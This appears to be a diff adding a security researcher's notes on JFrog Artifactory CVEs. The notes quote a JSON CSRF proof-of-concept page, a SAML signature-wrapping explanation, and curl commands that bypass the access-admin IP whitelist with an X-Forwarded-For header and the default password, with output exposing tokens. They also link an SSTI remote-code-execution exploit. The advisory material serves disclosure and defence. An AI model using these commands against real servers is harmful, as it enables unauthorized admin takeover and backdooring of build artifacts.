@@ -1,1 +1,323 @@
-tba
+
+
+***********************************************************
+JFrog Security Advisories
+
+https://jfrog.com/help/r/jfrog-release-information/jfrog-security-advisories
+
+https://jfrog.com/help/r/jfrog-release-information/fixed-security-vulnerabilities
+
+***********************************************************
+
+https://www.errno.fr/artifactory/Attacking_Artifactory
+
+***********************************************************
+CVE-2018-1000206
+****************
+
+JFrog Artifactory version since 5.11 contains a Cross ite Request Forgery (CSRF) vulnerability in UI rest endpoints that can result in Classic CSRF attack allowing an attacker to perform actions as logged in user. This attack appear to be exploitable via The victim must run maliciously crafted flash component. This vulnerability appears to have been fixed in 6.1.
+
+
+https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/
+
+
+Updated method: 
+
+<html>
+<title>JSON CSRF POC</title>
+<body>
+<center>
+<h1> JSON CSRF POC </h1>
+<script>
+fetch('http://vul-app.com', {method: 'POST', credentials: 'include', headers: {'Content-Type': 'text/plain'}, body: '{"name":"attacker","email":"attacker.com"}'});
+</script>
+<form action="#">
+<input type="button" value="Submit" />
+</form>
+</center>
+</body>
+</html>
+
+***********************************************************
+CVE-2018-19971: 
+***************
+
+JFrog Artifactory Pro SAML SSO signature validation error
+
+Affected products
+=================
+
+The SAML SSO addon in Artifactory 6.5.9 is vulnerable.
+The SAML SSO addon in Artifactory 6.5.13 is NOT vulnerable.
+
+Other versions were not tested.
+
+Background
+==========
+
+  "Artifactory offers a SAML-based Single Sign-On service allowing
+  federated Artifactory partners (identity providers) full control over
+  the authorization process.
+
+  Using SAML, Artifactory acts as service provider which receives
+  users' authentication information from external identity providers.
+  The SAML SSO addon in Artifactory Pro"
+
+  -- https://www.jfrog.com/confluence/display/RTF/SAML+SSO+Integration
+
+Description
+===========
+
+The SAML SSO addon in Artifactory 6.5.9 does not properly validate the
+XML signature in the SAMLResponse field send to the URL
+/webapp/saml/loginResponse. An attacker can use this flaw to login as
+any user if they already can login as some user.
+
+Let's assume that the attacker has obtained a valid SAML message of
+the form
+
+Root
+- Assertion id="original"
+   - Subject
+- Signature
+  - SignedInfo
+    - Reference URI="original"
+
+where the URI attribute of the Reference element points to the
+Assertion element.
+
+If we introduce a new Assertion element and make the original
+Assertion and Signature elements its children we end up with the
+message
+
+Root
+- Assertion id="evil"
+  - Subject
+  - Assertion id="original"
+    - Subject
+  - Signature
+   - SignedInfo
+     - Reference URI="original"
+
+When Artifactory processes this message it looks for the Signature
+element and checks that the original assertion is signed
+properly. However, it then proceeds to use the Subject information
+from the evil assertion which is fully under attacker's control.
+
+Exploit
+=======
+
+If you want to test this vulnerability you can fetch a fork of the
+SAMLRaider tool from https://github.com/lindi2/SAMLRaider and then
+select "XSW9" from the drop-down list.
+
+You might also want to take a look at the SAMLRaider documentation
+that shows how this variant differs from earlier similar
+vulnerabilities:
+
+https://github.com/lindi2/SAMLRaider/blob/af73ee4a71e3125188496da29a83799fdb41d8e8/src/main/resources/xswlist.png
+
+(The original documentation contained only bitmap images of text so it
+was not very easy to add new variants.)
+
+
+https://packetstormsecurity.com/files/152137
+
+***********************************************************
+CVE-2019-9733
+*************
+
+JFrog Artifactory Administrator Authentication Bypass 
+
+
+Affected Platforms and Versions
+===============================
+Product: JFrog Artifactory
+Version: < 6.8.6
+
+
+Vulnerability Overview
+======================
+Security risk: Critical
+Attack vector: Remote
+Vendor Status: Fixed in version 6.8.6 released March 12, 2019
+https://www.jfrog.com/confluence/display/RTF/Release+Notes#ReleaseNotes-Artifactory6.8.6
+
+
+Vulnerability Description
+=========================
+Artifactory has an account that can be used to reset the admin account password from localhost. 
+
+By providing the HTTP header ‘X-Forwarded-For’ it is possible to bypass Artifactory’s whitelist allowed_ips.
+
+Accessing the internal "password reset" admin account exposes the primary admin account's access token allowing an attacker to obtain admin access to the Artifactory server without disrupting other users' access.
+
+This vulnerability is exploitable in most configurations including when an external SSO provider such as Okta or Onelogin is used.
+
+
+Technical details
+=================
+
+Artifactory’s documentation [1] states that a default account, access-admin, is present and can be used to reset the admin user’s password. CipherTechs used curl to see if the access-admin account was present and had the default password of password.
+
+$ curl -ks -u access-admin:password https://artifactory.lan/artifactory/api/access/api/v1/users/ {
+  "errors" : [ {
+    "code" : "FORBIDDEN",
+    "message" : "User 'access-admin' is not allowed to login from remote address: [IP REDACTED]"
+  } ]
+}
+
+The error message shows that the credential access-admin:password is valid, but not allowed to login remotely. CipherTechs bypassed this measure by providing a X-Forwarded-For HTTP header and set it to 127.0.0.1 (localhost).
+
+$ curl -ks -H 'X-Forwarded-For: 127.0.0.1' -u access-admin:password https://artifactory.lan/artifactory/api/access/api/v1/users/  | jq .
+{
+  "users": [
+    {
+      "username": "access-admin",
+      "realm": "internal",
+      "status": "enabled",
+      "allowed_ips": [
+        "127.0.0.1"
+      ],
+      "created": "2019-01-19T20:00:40.327Z",
+      "modified": "2019-02-14T15:55:41.052Z",
+      "last_login_time": "1970-01-01T00:00:00.000Z",
+      "custom_data": {},
+      "password_expired": false,
+      "password_last_modified": 1518623741047,
+      "groups": []
+    },
+    {
+      "username": "admin",
+      "realm": "internal",
+      "status": "enabled",
+      "allowed_ips": [
+        "*"
+      ],
+      "created": "2019-01-19T20:01:09.806Z",
+      "modified": "2019-02-14T15:38:54.481Z",
+      "last_login_time": "2019-02-20T11:53:57.973Z",
+      "last_login_ip": "[REDACTED]",
+      "custom_data": {
+        "public_key": "[REDACTED]",
+        "updatable_profile": "true",
+        "basictoken_shash": "[REDACTED]",
+        "private_key": "[REDACTED]",
+        "artifactory_admin": "true",
+        "basictoken": "[REDACTED]"
+      },
+      "password_expired": false,
+      "password_last_modified": 1518623741101,
+      "groups": []
+
+[ CIPHERTECHS: LONG RESPONSE REMOVED FOR BREVITY. All users, keys, and tokens are returned]
+
+ 
+Once authenticated as admin, the full rich Artifactory API was available [2] and yielded sensitive details. For example, the following request retrieves all builds.
+
+$ curl -H"Authorization: Bearer $basictoken_value" -ks https://artifactory.lan/artifactory/api/builds/
+
+The admin account has rights to publish artifacts and can overwrite existing files, making it possible for an attacker to backdoor existing artifacts that current and future builds depend on and giving persistent access across all environments and developer workstations.
+
+Artifactory servers can be discovered by requesting the URI /artifactory/webapp/ and looking for the X-Artifactory-Id HTTP response header.
+
+$ curl -I https://artifactory.lan/artifactory/webapp/
+HTTP/1.1 200 OK
+Accept-Ranges: bytes
+Cache-Control: no-store,max-age=0
+Cache-control: no-cache="set-cookie"
+Content-Length: 2239
+Content-Type: text/html
+Date: Mon, 23 Feb 2019 17:24:08 GMT
+ETag: W/"2239-1549437200000"
+Last-Modified: Wed, 06 Feb 2019 07:13:20 GMT
+Server: Artifactory/6.7.3
+X-Artifactory-Id: d9b50a320385a5e306762e0c0a88ad4f6fe1527b
+X-Artifactory-Node-Id: artifactory-node-1
+X-FRAME-OPTIONS: DENY
+Connection: keep-alive
+
+
+Recommendations
+===============
+Upgrade to JFrog Artifactory 6.8.6 or higher. 
+
+Change the default access-admin password. 
+
+Block external access to /api.
+
+Review Artifactory logs for previous API use and any signs of access from unauthorized IP addresses.
+
+Revoke basic tokens for all users. The example command below will revoke the basic token for the access-admin account.
+curl -H "Content-Type: application/json+merge-patch" -XPATCH -uaccess-admin --data '{"username":"admin","custom_data":{"basictoken_shash":{"value":"REDACTED","sensitive":false},"basictoken":{"value":"","sensitive":true}}}' https://artifactory.lan/artifactory/api/v1/users/admin
+
+
+References:
+[1] https://www.jfrog.com/confluence/display/RTF/Managing+Users
+[2] https://www.jfrog.com/confluence/display/RTF/Artifactory+REST+API
+[3] https://www.ciphertechs.com/blog/jfrog-artifactory-advisory/
+
+***********************************************************
+CVE-2020-7931
+*************
+
+SSTI exploitation in Artifactory Pro
+
+CVE-2020-7931 is somewhat of a purposeful misconfiguration vulnerability in Artifactory that lets attackers conduct server-side template injections from a FreeMarker template.
+
+The vulnerability was discovered by Ryan Hanson from Atredis and was fixed for all affected versions in late 2019. It will only work on the Pro versions of Artifactory, as other versions do not have templating capabilities.
+
+This repository contains a script and a template.
+
+The python script is a wrapper to automate the uploading, deployment and execution of template payloads.
+The template implements many primitives (read, list, write...) that interact with the filesystem and lead to Remote Code Execution.
+
+
+https://github.com/gquere/CVE-2020-7931
+
+***********************************************************
+CVE-2021-3860
+*************
+
+JFrog Artifactory before 7.25.4 (Enterprise+ deployments only), is vulnerable to Blind SQL Injection by a low privileged authenticated user due to incomplete validation when performing an SQL query.
+
+https://jfrog.com/help/r/jfrog-release-information/cve-2021-3860-artifactory-low-privileged-blind-sql-injection
+
+
+
+
+***********************************************************
+
+
+***********************************************************
+
+
+***********************************************************
+
+
+
+***********************************************************
+
+
+***********************************************************
+
+
+***********************************************************
+
+
+***********************************************************
+
+***********************************************************
+
+
+
+***********************************************************
+
+
+***********************************************************
+
+
+***********************************************************
+
+
+***********************************************************
